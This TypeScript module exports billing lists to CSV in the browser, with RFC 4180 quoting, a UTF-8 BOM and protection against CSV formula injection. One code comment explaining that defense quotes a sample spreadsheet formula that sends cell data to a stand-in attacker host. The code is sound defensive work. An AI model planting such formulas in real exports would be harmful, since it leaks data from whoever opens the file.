/**
 * Minimal client-side CSV exporter for billing lists. Solves the
 * tax-season "give my CPA a spreadsheet" need without a server round
 * trip: build the rows in memory, serialize, trigger a download.
 *
 * Why hand-rolled? The CSV format itself is simple (RFC 4180), and we
 * only need it on a few list pages. Pulling in a library (papaparse,
 * etc.) would be heavier than the entire helper.
 *
 * What it handles:
 *   - Quoting fields that contain commas, double quotes, or newlines
 *   - Escaping embedded double quotes by doubling them ("" inside "...")
 *   - Excel-compatible BOM so accented characters survive on Windows
 *   - Numbers and dates serialized as-is (the caller is responsible for
 *     pre-formatting — we don't guess locale)
 *
 * What it doesn't handle:
 *   - Streaming for very large datasets. The whole CSV is built in
 *     memory then handed to a Blob. Fine for billing lists; would need
 *     rework if we ever export 100K+ rows.
 */

export type CsvCell = string | number | boolean | null | undefined;

export interface CsvColumn<T> {
  /** Header text — appears as the column title in row 0. */
  header: string;
  /** Extract the cell value for a given row. Return null/undefined for empty. */
  value: (row: T) => CsvCell;
}

/**
 * Characters that Excel / Google Sheets / Numbers interpret as the
 * start of a formula when they appear at the beginning of a cell.
 * If a user puts `=HYPERLINK("http://evil.com?c="&A1,"click")` in a
 * vendor name and a CPA opens our exported CSV in Excel, the formula
 * fires. The standard defense (OWASP's CSV-injection guidance) is to
 * prefix the cell with a single quote — Excel treats it as a literal,
 * not a formula, and the leading quote stays out of the visible value
 * in most clients.
 *
 * We also block leading tab / CR / LF because some clients trim them
 * silently and then evaluate what's left.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r\n]/;

/** Serialize one cell per RFC 4180 with CSV-injection protection.
 *  null/undefined become empty strings. */
function escapeCell(input: CsvCell): string {
  if (input === null || input === undefined) return '';
  let s = typeof input === 'string' ? input : String(input);
  // Defang formulas before quoting — the leading single quote becomes
  // part of the cell content, so it has to be inside the quotes if the
  // value needs quoting at all.
  if (FORMULA_TRIGGERS.test(s)) {
    s = `'${s}`;
  }
  // Quote if it contains a comma, quote, or newline.
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/** Build the CSV text for a row set. Use `downloadCsv` to trigger a save
 *  dialog directly — exported separately so tests / debug can inspect
 *  the raw output. */
export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const headerLine = columns.map(c => escapeCell(c.header)).join(',');
  const dataLines = rows.map(row =>
    columns.map(c => escapeCell(c.value(row))).join(','),
  );
  return [headerLine, ...dataLines].join('\r\n');
}

/** Synthesize a Blob and trigger a download via a hidden <a> click.
 *  No-op on the server. Prepends the UTF-8 BOM so Excel on Windows
 *  reads the encoding correctly (without it, ñ/é/£/etc. show as
 *  garbage). */
export function downloadCsv<T>(
  filename: string,
  rows: T[],
  columns: CsvColumn<T>[],
): void {
  if (typeof window === 'undefined') return;
  const csv = toCsv(rows, columns);
  // BOM ensures Excel detects UTF-8 instead of guessing CP-1252.
  const blob = new Blob(['﻿', csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  // Release the object URL after the click handler has had a chance to
  // run. Some browsers fire the download asynchronously. Wrap in
  // try/catch — older / non-standard browsers can throw here and we
  // don't want that to bubble out of a fire-and-forget timer.
  setTimeout(() => {
    try { URL.revokeObjectURL(url); }
    catch { /* harmless — the URL becomes garbage-collectable anyway */ }
  }, 100);
}

/** Build a timestamped filename — useful default for "export current
 *  filter view". Example: `invoices-2026-05-29.csv`. */
export function timestampedFilename(prefix: string, ext = 'csv'): string {
  const today = new Date().toISOString().slice(0, 10);
  return `${prefix}-${today}.${ext}`;
}
